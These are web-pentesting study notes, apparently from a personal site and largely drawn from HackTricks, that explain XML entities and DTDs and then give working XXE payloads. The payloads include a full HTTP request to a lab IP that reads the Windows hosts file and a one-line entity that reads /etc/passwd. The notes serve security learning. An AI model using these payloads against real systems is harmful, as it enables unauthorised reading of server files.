---
title: XXE - XEE XML External Entity attack 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - web pentesting
  - xee
  - xxe
---

# XXE - XEE XML External Entity attacks

Most of this content comes from [HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity).

## Basic concepts

### What it XML?

XML stands for "extensible markup language". XML is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. 

### What are XML entities?

XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities &lt; and &gt; represent the characters < and >. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.

### What are XML elements?

Element type declarations set the rules for the type and number of elements that may appear in an XML document, what elements may appear inside each other, and what order they must appear in. For example:

```
<!ELEMENT stockCheck ANY> Means that any object could be inside the parent <stockCheck></stockCheck>

<!ELEMENT stockCheck EMPTY> Means that it should be empty <stockCheck></stockCheck>

<!ELEMENT stockCheck (productId,storeId)> Declares that <stockCheck> can have the children <productId> and <storeId>
```

### What is document type definition?

The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional DOCTYPE element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.


### What are XML custom entities?

XML allows custom entities to be defined within the DTD. For example:

```
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
```

This definition means that any usage of the entity reference &myentity; within the XML document will be replaced with the defined value: "my entity value".


### What are XML external entities?

XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared. The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded. For example:

```
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
```

The URL can use the file:// protocol, and so external entities can be loaded from file. For example:

```
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

## Main attacks

### New Entity test

In this attack I'm going to test if a simple new ENTITY declaration is working:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
    <productId>&toreplace;</productId>
    <storeId>1</storeId>
</stockCheck>
```

### Read the file attack

In a windows system, we may use c:/windows/system32/drivers/etc/hosts:

```
POST /process.php HTTP/1.1
Host: 10.129.95.192
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Content-Length: 192
Origin: http://10.129.95.192
Connection: close
Referer: http://10.129.95.192/services.php
Cookie: PHPSESSID=1gjqt353d2lm5222nl3ufqru10

<?xml version = "1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]>
<order><quantity>2</quantity><item>
&test;
</item><address>1</address></order>
```

In a Linux server go for 

```
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
```
